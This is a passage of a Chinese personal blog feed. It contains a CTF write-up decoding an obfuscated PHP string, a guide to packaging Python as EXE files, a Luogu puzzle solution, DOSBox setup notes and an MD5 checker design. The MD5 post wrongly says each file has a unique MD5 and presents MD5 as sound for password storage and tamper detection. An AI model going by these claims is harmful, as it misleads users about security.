class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><span class="hljs-comment">*/</span><span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>分析：</strong></p><ul><li><p><code>strlen()</code> 函数返回字符串的长度</p></li><li><p><code>strrev()</code>  反转字符串顺序</p></li></ul><p><em>This is an example:</em></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>输出反转字符串 “!dlroW olleH”：</p><ul><li><p><code>substr()</code> 函数返回字符串的一部分。<code>substr(string,start,length)</code></p><p>tips：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p></li><li><p><code>&lt;?php echo substr(&quot;Hello world&quot;,6); ?&gt;</code>从字符串中返回 “world”：</p></li><li><p><code>ord()</code> 函数返回字符串中第一个字符的 ASCII 值。</p></li><li><p><code>chr()</code> 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。</p></li><li><p>“.” 是字符运算符，作用是把两个字符串连接起来，其使用方法：首先创建一个PHP示例文件；然后定义两个变量；最后通过“$result.$result”方式将两个变量连接起来即可</p></li><li><p><code>str_rot13()</code> 函数对字符串执行 ROT13 编码。</p><p>ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。</p></li></ul><p>综上，题目提示我们逆向加密算法，也就是说第一步加密变为最后一步，以此类推，那可以构造出逆向后的代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$miwen</span>)));  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>++)&#123;<span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)-<span class="hljs-number">1</span>;<span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$d</span>); <span class="hljs-variable">$b</span>=<span class="hljs-variable">$b</span>.<span class="hljs-variable">$_c</span>;&#125;<span class="hljs-variable">$p</span>= <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$b</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/images/web2-flag.PNG" alt="Successfully caught the flag!"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Python打包成EXE的那些事</title>
    <link href="/2025/07/12/%E5%85%B3%E4%BA%8EPython%E6%89%93%E5%8C%85%E6%88%90EXE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2025/07/12/%E5%85%B3%E4%BA%8EPython%E6%89%93%E5%8C%85%E6%88%90EXE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="一、为咩要打包Python程序？">一、为咩要打包Python程序？</h2><p>设想下，你是一位Python开发者，而且你经常将你开发的各类工具分享给你的好朋友们使用，但是你的好朋友可能并不一定是学计算坤的，所以对方可能会没有Python环境也在情理之中，这时候就需要将.py文件打包成.exe可执行文件。常见的应用场景包括：</p><ul><li>给非技术人员使用的小工具</li><li>需要保密的商业软件</li><li>方便分发的应用程序</li></ul><p>于是在此我将介绍5种打包方式，具体选择哪一种可以根据你的喜好。</p><h2 id="各类打包方式过程和对比">各类打包方式过程和对比</h2><h3 id="方法1：PyInstaller">方法1：PyInstaller</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>pip install pyinstaller<span class="hljs-comment"># 打包命令（基础版）</span>pyinstaller -F -w your-python-program.py<span class="hljs-comment"># 高级版（添加图标）</span>pyinstaller -F -w -i app.ico your-python-program.py</code></pre></div><ul><li><code>-F</code>：打包成单个exe文件</li><li><code>-w</code>：隐藏控制台窗口（GUI程序专用）</li><li><code>-i</code>：设置程序图标</li></ul><h3 id="方法2：cx-Freeze">方法2：cx_Freeze</h3><p>创建setup.py文件：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> cx_Freeze <span class="hljs-keyword">import</span> setup, Executablesetup(    name=<span class="hljs-string">&quot;代码管理工具&quot;</span>,    version=<span class="hljs-string">&quot;1.0&quot;</span>,    description=<span class="hljs-string">&quot;Python代码管理工具&quot;</span>,    executables=[Executable(<span class="hljs-string">&quot;your-python-program.py&quot;</span>, base=<span class="hljs-string">&quot;Win32GUI&quot;</span>)])</code></pre></div><p>执行打包：</p><div class="code-wrapper"><pre><code class="hljs bash">python setup.py build</code></pre></div><h3 id="方法3：Nuitka（编译为原生二进制）">方法3：Nuitka（编译为原生二进制）</h3><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment"># 安装</span>pip install nuitka<span class="hljs-comment"># 打包命令</span>nuitka --standalone --onefile --windows-disable-console code-summar-tool.py</code></pre></div><h3 id="方法4：Py2exe（仅Windows）">方法4：Py2exe（仅Windows）</h3><p><a href="http://xn--setup-ll6hz28e.py">创建setup.py</a>：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> distutils.core <span class="hljs-keyword">import</span> setup<span class="hljs-keyword">import</span> py2exesetup(windows=[<span class="hljs-string">&quot;your-python-program.py&quot;</span>])</code></pre></div><p>执行打包：</p><div class="code-wrapper"><pre><code class="hljs bash">python setup.py py2exe</code></pre></div><h3 id="方法5：auto-py-to-exe（图形界面）">方法5：auto-py-to-exe（图形界面）</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>pip install auto-py-to-exe<span class="hljs-comment"># 启动图形界面</span>auto-py-to-exe</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to design an MD5 verifier - 后记</title>
    <link href="/2025/07/12/verifier-talk/"/>
    <url>/2025/07/12/verifier-talk/</url>
    
    <content type="html"><![CDATA[<h1>后记：</h1><p>在<code>MD5-Checker</code> 项目开发中，我也遇到了很多知识面缺陷的问题，于是在开发过程中我选择使用了AI来辅助开发（学艺不精）在此，我根据AI的建议，梳理了一份思路——如何成为一名合格的Devloper</p><p>以下是针对MD5校验工具设计思路所涉及的软件工程原则（以MD5-Checker开发为例）、经典理论以及对应的学习吸收方法的系统化总结：</p><hr><h3 id="一、涉及的核心理论与原则">一、涉及的核心理论与原则</h3><h4 id="1-模块化设计">1. <strong>模块化设计</strong></h4><ul><li><strong>SOLID原则</strong>（尤其是单一职责原则）<ul><li>每个函数只做一件事（如<code>calculate_md5</code>仅负责计算）</li><li>参考：《Clean Code》by Robert C. Martin</li></ul></li><li><strong>关注点分离(SoC)</strong><ul><li>CLI解析、业务逻辑、文件操作分层处理</li></ul></li></ul><h4 id="2-性能优化">2. <strong>性能优化</strong></h4><ul><li><strong>I/O效率原则</strong><ul><li>分块大小选择（64KB）涉及《操作系统概念》中的磁盘预读策略</li><li>参考：Linux内核的<code>readahead</code>机制</li></ul></li><li><strong>时间/空间权衡</strong><ul><li>内存分块 vs 计算速度的平衡（《算法导论》第17章平摊分析）</li></ul></li></ul><h4 id="3-错误处理">3. <strong>错误处理</strong></h4><ul><li><strong>防御式编程</strong><ul><li><code>try/except</code>处理文件操作（《代码大全》第8章）</li></ul></li><li><strong>契约设计</strong><ul><li>函数输入/输出约定（如<code>verify_md5</code>返回布尔值）</li></ul></li></ul><h4 id="4-接口设计">4. <strong>接口设计</strong></h4><ul><li><strong>Unix哲学</strong><ul><li>“Do One Thing and Do It Well”（命令行工具设计）</li><li>参考：《The Art of Unix Programming》</li></ul></li></ul><h4 id="5-可扩展性">5. <strong>可扩展性</strong></h4><ul><li><strong>开放封闭原则(OCP)</strong><ul><li>通过<code>hashlib.new()</code>预留多算法支持</li><li>参考：《设计模式：可复用面向对象软件的基础》</li></ul></li></ul><hr><h3 id="二、学习吸收方法论">二、学习吸收方法论</h3><h4 id="1-理论-→-实践循环">1. <strong>理论 → 实践循环</strong></h4><ul><li><strong>步骤</strong>：<ol><li>阅读《Clean Code》函数设计章节 → 重构自己的函数</li><li>研究Linux文件系统预读机制 → 调整<code>block_size</code>测试性能</li><li>学习SOLID原则 → 分析工具中哪些模块符合/违反原则</li></ol></li></ul><h4 id="2-代码考古学">2. <strong>代码考古学</strong></h4><ul><li><p><strong>经典工具对比学习</strong>：</p><p>bash</p><div class="code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-comment"># 研究GNU coreutils的md5sum实现</span>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>://git.sv.gnu.org/coreutilsgrep -r <span class="hljs-string">&quot;BLOCKSIZE&quot;</span> src/</code></pre></div></li><li><p><strong>Python生态参考</strong>：</p><ul><li>对比<code>hashlib</code>与<code>cryptography</code>库的设计差异</li></ul></li></ul><h4 id="3-量化分析实践">3. <strong>量化分析实践</strong></h4><ul><li><p><strong>性能基准测试</strong>：</p><p>python</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> timeit<span class="hljs-attribute">timeit</span>.timeit(&#x27;calculate_md5(<span class="hljs-string">&quot;large_file.iso&quot;</span>, block_size=<span class="hljs-number">8192</span>)&#x27;, number=<span class="hljs-number">10</span>)</code></pre></div></li><li><p><strong>内存分析</strong>：</p><p>bash</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> memory_profiler md5_tool.<span class="hljs-keyword">py</span></code></pre></div></li></ul><h4 id="4-设计模式映射">4. <strong>设计模式映射</strong></h4><ul><li><p><strong>识别模式应用</strong>：</p><table><thead><tr><th style="text-align:left">模式</th><th style="text-align:left">本工具实例</th></tr></thead><tbody><tr><td style="text-align:left">模板方法</td><td style="text-align:left"><code>calculate_md5</code>的分块处理流程</td></tr><tr><td style="text-align:left">工厂方法</td><td style="text-align:left"><code>hashlib.md5()</code>构造函数</td></tr><tr><td style="text-align:left">命令模式</td><td style="text-align:left">argparse子命令实现</td></tr></tbody></table></li></ul><h4 id="5-刻意练习路线">5. <strong>刻意练习路线</strong></h4><ol><li><strong>基础阶段</strong>：<ul><li>实现单文件MD5计算（理解分块哈希）</li><li>添加单元测试（文件不存在、空文件等case）</li></ul></li><li><strong>进阶阶段</strong>：<ul><li>增加SHA-256支持（实践开放封闭原则）</li><li>实现多线程批量计算（学习GIL限制）</li></ul></li><li><strong>高级阶段</strong>：<ul><li>开发VS Code插件调用该工具（接口设计实践）</li><li>用Rust重写性能关键部分（FFI交互学习）</li></ul></li></ol><hr><h3 id="三、推荐学习资源">三、推荐学习资源</h3><h4 id="1-必读经典">1. <strong>必读经典</strong></h4><ul><li>《代码大全》第5章（设计）、第8章（防御式编程）</li><li>《Unix编程艺术》第1章（模块化）、第7章（接口设计）</li></ul><h4 id="2-论文参考">2. <strong>论文参考</strong></h4><ul><li><em>The MD5 Message-Digest Algorithm</em> (RFC 1321)</li><li><em>A Quantitative Study of File Systems’ Block Size Selection</em> (FAST’13)</li></ul><h4 id="3-实践项目">3. <strong>实践项目</strong></h4><ul><li>GNU coreutils源码（md5sum实现）</li><li>Python标准库<code>hashlib</code>的C实现（<code>_hashlib.c</code>）</li></ul><h4 id="4-可视化学习">4. <strong>可视化学习</strong></h4><ul><li>MD5算法可视化：<a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a></li><li>I/O缓冲区交互演示：<a href="https://www.linuxatemyram.com/">https://www.linuxatemyram.com/</a></li></ul><hr><h3 id="四、知识吸收检查表">四、知识吸收检查表</h3><p>当你认为自己已掌握某个概念时，尝试回答：</p><table><thead><tr><th style="text-align:left">检查项</th><th style="text-align:left">是/否</th><th style="text-align:left">示例</th></tr></thead><tbody><tr><td style="text-align:left">能解释64KB块大小的选择依据？</td><td style="text-align:left">✓</td><td style="text-align:left">磁盘扇区对齐、内存页大小</td></tr><tr><td style="text-align:left">能画出数据流图？</td><td style="text-align:left">✓</td><td style="text-align:left">文件→分块→哈希更新→hexdigest</td></tr><tr><td style="text-align:left">能列举3种替代设计方案？</td><td style="text-align:left">✓</td><td style="text-align:left">mmap映射、内存视图、GPU加速</td></tr><tr><td style="text-align:left">能说明异常处理的设计取舍？</td><td style="text-align:left">✓</td><td style="text-align:left">返回None vs 抛出异常</td></tr></tbody></table><hr><p>通过这种结构化学习路径，你可以将工具开发经验转化为可迁移的软件工程能力，逐步构建自己的系统设计思维体系。</p><p>上了个置顶，遍笔者和各位朋友慢慢消化吸收</p><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>P1149 [NOIP 2008 提高组] 火柴棒等式</title>
    <link href="/2025/07/12/P1149-Matchstick/"/>
    <url>/2025/07/12/P1149-Matchstick/</url>
    
    <content type="html"><![CDATA[<p><strong>题目地址：</strong> <em><a href="https://www.luogu.com.cn/problem/P1149">https://www.luogu.com.cn/problem/P1149</a></em></p><h2 id="Solution">Solution:</h2><p><strong>分析</strong>：一道暴力枚举题，先枚举出 <code>A</code> 和 <code>B</code> 所有可能的数字，设<code>$f_&#123;i&#125;$</code> 表示拼成数字 <code>i</code> 所用的火柴数，若$f_{A}+f_{B}+f_{A+B}=n−4$，答案加一，这里减 4 是减去加号和等号所用火柴。</p><p>因为<code>n</code>的范围是<em>n</em>(1≤<em>n</em>≤24)，因此枚举总量不会太大，大致枚举到1000就可以了。</p><p><em>AC Code</em>:</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>&#125;,n,ans;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;    <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">10</span>)        <span class="hljs-keyword">return</span> a[x];    <span class="hljs-keyword">return</span> <span class="hljs-built_in">f</span>(x/<span class="hljs-number">10</span>)+a[x%<span class="hljs-number">10</span>];&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">1000</span>;++i)        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">1000</span>;++j)            ans+=(<span class="hljs-built_in">f</span>(i)+<span class="hljs-built_in">f</span>(j)+<span class="hljs-built_in">f</span>(i+j)==n<span class="hljs-number">-4</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下8086汇编语言环境搭建</title>
    <link href="/2025/07/11/Linux%E4%B8%8B8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/07/11/Linux%E4%B8%8B8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="Description">Description:</h3><p>dosbox是一个免费开源跨平台的MS-DOS模拟器。用它可以编译运行8086汇编</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install dosbox</code></pre></div><p><img src="/images/successfully-to-install-dosbox.PNG" alt="成功安装dosbox"><br>如图所示已成功安装dosbox</p><p>接下来挂载驱动器C盘并进入C盘：</p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">Z:</span>\&gt;mount c <span class="hljs-keyword">/home/</span>zhailin/ASM-Test<span class="hljs-symbol">Z:</span>\&gt;c:</code></pre></div><p><img src="/images/diskc.PNG" alt="成功挂载并进入C盘"></p><p>如上图成功将linux下的路径&quot;/home/ubuntu/masm/&quot;这个路径挂载为dosbox虚拟机的序盘，并进入到了c盘</p><p><s>虚拟机安装之后，进行汇编开发学习还需要masm、link、debug三个工具；其中masm是汇编工具、link是链接工具、debug是调试工具。</s></p><p>修正：dosbox中的虚拟机已经自带<code>Debug</code>和<code>link</code></p><p><img src="/images/test.PNG" alt="images"></p><p>写一个helloworld并尝试编译</p><p>在此笔者遇到了一个问题，目前尚不清楚如何在Linux下的dosbox安装masm，如有方法欢迎提出！</p><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>底层</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-asm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to design an MD5 verifier</title>
    <link href="/2025/07/11/md5verifier-20250711/"/>
    <url>/2025/07/11/md5verifier-20250711/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<em><a href="https://github.com/fishcanf1y/MD5-Checker">https://github.com/fishcanf1y/MD5-Checker</a></em></p><h2 id="Description">Description:</h2><p>MD5 校验器用于验证数据完整性和检测数据是否被篡改，常用于文件下载、软件更新、密码存储等场景。它可以快速生成文件的“数字指纹”——MD5 值，然后将该值与原始值进行比较，以确保文件在传输或存储过程中没有发生变化。</p><p>以下是MD5 校验器的主要用途和优势：</p><ul><li><p><strong>文件完整性验证:</strong></p><p>当下载文件时，网站通常会提供文件的MD5 值。下载完成后，用户可以使用MD5 校验器计算下载文件的MD5 值，并与提供的MD5 值进行比较。如果两者一致，则表示文件没有损坏或被篡改；如果不一致，则表示文件可能损坏或被恶意修改，需要重新下载。</p></li><li><p><strong>数据一致性验证:</strong></p><p>在数据传输和存储过程中，可能会出现错误或干扰导致数据损坏。通过对数据进行MD5 校验，可以确保数据在不同节点之间的一致性，防止数据丢失或损坏。</p></li><li><p><strong>安全性保护:</strong></p><p>MD5 校验可以用于检测恶意篡改。如果文件在传输过程中被恶意篡改，其MD5 值会发生变化，从而可以及时发现并阻止恶意行为。</p></li><li><p><strong>文件识别和重复性检测:</strong></p><p>每个文件都有一个唯一的MD5 值，可以用于快速识别文件，避免存储和传输重复文件，节省存储空间和带宽。</p></li><li><p><strong>密码存储:</strong></p><p>虽然MD5 算法不再被推荐用于直接存储密码，但它仍然被广泛用于存储密码的哈希值。这样即使数据库泄露，攻击者也无法直接获取用户的明文密码。</p></li></ul><p>总而言之，MD5 校验器在保证数据安全和完整性方面发挥着重要作用，尤其是在文件传输、数据存储和密码管理等场景中。</p><h2 id="How-To-Do">How To Do?</h2><p>以下我将梳理大致思路并列举一些代码片段来说明其作用</p><h3 id="一、核心目标">一、核心目标</h3><ol><li><strong>核心功能</strong>：<ul><li>计算文件的MD5哈希值（文件完整性指纹）</li><li>验证文件是否与预期MD5匹配</li><li>支持批量处理和目录递归操作</li></ul></li><li><strong>非功能性需求</strong>：<ul><li>内存安全（支持大文件处理）</li><li>跨平台兼容性（Windows/Linux/macOS）</li><li>符合标准工具行为（兼容<code>md5sum</code>格式）</li></ul></li></ol><h3 id="二、关键实现思路">二、关键实现思路</h3><h4 id="1-文件哈希计算（核心算法）">1. 文件哈希计算（核心算法）</h4><p><strong>设计要点</strong>：</p><ul><li><strong>分块处理</strong>：避免内存溢出</li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_md5</span>(<span class="hljs-params">file_path, block_size=<span class="hljs-number">65536</span></span>):    md5 = hashlib.md5()    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span>(<span class="hljs-keyword">lambda</span>: f.read(block_size), <span class="hljs-string">b&#x27;&#x27;</span>):            md5.update(block)  <span class="hljs-comment"># 增量更新哈希</span>    <span class="hljs-keyword">return</span> md5.hexdigest()</code></pre></div><ul><li><p>使用生成器模式逐块读取（<code>iter+lambda</code>技巧）</p></li><li><p>默认64KB块大小平衡I/O效率和内存占用</p></li><li><p><strong>错误处理</strong>：</p><ul><li>捕获<code>IOError</code>并返回<code>None</code>统一表示失败</li><li>二进制模式(<code>'rb'</code>)确保跨平台一致性</li></ul></li></ul><h4 id="2-验证机制">2. 验证机制</h4><p><strong>设计要点</strong>：</p><ul><li><strong>大小写不敏感</strong>：<code>.lower()</code>处理用户输入</li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">if</span> actual_md5.lower() == expected_md5.lower()</code></pre></div><ul><li><p><strong>明确输出</strong>：格式化显示预期/实际值对比</p></li><li><p><strong>返回布尔值</strong>：便于脚本化调用</p></li></ul><h4 id="3-批量处理">3. 批量处理</h4><p><strong>递归目录处理</strong>：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> root, _, files <span class="hljs-keyword">in</span> os.walk(directory):    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> files:        file_path = os.path.join(root, filename)        relative_path = os.path.relpath(file_path, directory)</code></pre></div><ul><li>使用<code>os.walk</code>实现深度优先遍历</li><li><code>os.path.relpath</code>生成相对路径保证校验文件可移植性</li></ul><h4 id="4-命令行接口">4. 命令行接口</h4><p><strong>子命令模式</strong>：</p><div class="code-wrapper"><pre><code class="hljs python">subparsers = parser.add_subparsers(dest=<span class="hljs-string">&#x27;command&#x27;</span>)calc_parser = subparsers.add_parser(<span class="hljs-string">&#x27;calc&#x27;</span>)verify_parser = subparsers.add_parser(<span class="hljs-string">&#x27;verify&#x27;</span>)</code></pre></div><ul><li>分离<code>calc</code>和<code>verify</code>逻辑</li><li>自动生成帮助信息（<code>-h</code>）</li></ul><hr><h3 id="三、典型工作流程">三、典型工作流程</h3><h4 id="场景1：单文件验证">场景1：单文件验证</h4><p><img src="/images/verifier_1_20250712.png" alt="单文件验证"></p><h4 id="场景2：生成验证文件">场景2：生成验证文件</h4><p><img src="/images/verifier_2_20250712.png" alt="生成验证文件"></p><h3 id="四、扩展设计思路">四、扩展设计思路</h3><h4 id="1-算法扩展点">1. 算法扩展点</h4><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_hash</span>(<span class="hljs-params">file_path, algorithm=<span class="hljs-string">&#x27;md5&#x27;</span>, block_size=<span class="hljs-number">65536</span></span>):    hasher = hashlib.new(algorithm)  <span class="hljs-comment"># 动态选择算法</span>    <span class="hljs-comment"># ...相同处理逻辑...</span></code></pre></div><h4 id="2-性能优化方向">2. 性能优化方向</h4><ul><li><strong>并行计算</strong>：使用<code>concurrent.futures</code>加速批量处理</li><li><strong>进度显示</strong>：添加<code>tqdm</code>进度条</li></ul><h4 id="3-安全增强">3. 安全增强</h4><ul><li><strong>签名校验</strong>：支持PGP签名验证</li><li><strong>哈希链</strong>：实现类似<code>git</code>的对象哈希链</li></ul><h4 id="4-工程化改进">4. 工程化改进</h4><ul><li><strong>单元测试</strong>：针对大文件/空文件/非法路径等边界条件</li><li><strong>日志记录</strong>：添加<code>logging</code>模块记录操作</li></ul><hr><h3 id="五、设计权衡考量">五、设计权衡考量</h3><ol><li><strong>内存 vs 速度</strong>：<ul><li>选择64KB块大小而非一次性读取</li><li>牺牲少量速度换取内存安全性</li></ul></li><li><strong>灵活性 vs 复杂度</strong>：<ul><li>不默认支持多算法保持简单性</li><li>但保留扩展接口</li></ul></li><li><strong>严格模式可选</strong>：<ul><li>当前大小写不敏感验证</li><li>可添加<code>--strict</code>参数启用严格匹配</li></ul></li></ol><h3 id="六、最终代码呈现">六、最终代码呈现</h3><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span><span class="hljs-comment"># 常量定义</span>DEFAULT_BLOCK_SIZE = <span class="hljs-number">65536</span>  <span class="hljs-comment"># 64KB块大小</span>MD5_FILE_EXTENSION = <span class="hljs-string">&#x27;.md5&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_md5</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span>, block_size: <span class="hljs-built_in">int</span> = DEFAULT_BLOCK_SIZE</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]:    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    计算文件的MD5哈希值</span><span class="hljs-string">    :param file_path: 文件路径</span><span class="hljs-string">    :param block_size: 读取块大小(字节)</span><span class="hljs-string">    :return: MD5字符串(失败返回None)</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path):        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 文件不存在 - <span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    md5 = hashlib.md5()    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:            <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span>(<span class="hljs-keyword">lambda</span>: f.read(block_size), <span class="hljs-string">b&#x27;&#x27;</span>):                md5.update(block)        <span class="hljs-keyword">return</span> md5.hexdigest()    <span class="hljs-keyword">except</span> (IOError, PermissionError) <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 无法读取文件 <span class="hljs-subst">&#123;file_path&#125;</span> - <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">batch_calculate_md5</span>(<span class="hljs-params">file_list: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]]:    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    批量计算MD5值</span><span class="hljs-string">    :param file_list: 文件路径列表</span><span class="hljs-string">    :return: 字典&#123;文件路径: MD5值&#125;</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">return</span> &#123;file_path: calculate_md5(file_path) <span class="hljs-keyword">for</span> 